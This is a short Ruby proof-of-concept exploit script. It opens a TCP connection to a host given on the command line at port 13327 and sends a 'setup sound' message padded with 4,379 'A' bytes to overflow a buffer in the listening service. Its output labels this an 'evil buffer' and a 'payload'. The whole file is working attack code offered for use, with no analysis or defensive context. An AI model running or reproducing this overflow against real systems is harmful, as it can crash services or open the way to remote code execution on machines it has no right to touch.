require 'socket'

host = ARGV[0]

crash = "\x41" * 4379

buffer = "\x11(setup sound #{crash}\x90\x00"

Socket.tcp(host, 13327) do |s|
    puts "[*] Sending evil buffer to host #{host}"
    msg, _ = s.recvfrom 1024
    puts msg
    s.sendmsg buffer
end

print '[*] Payload sent'
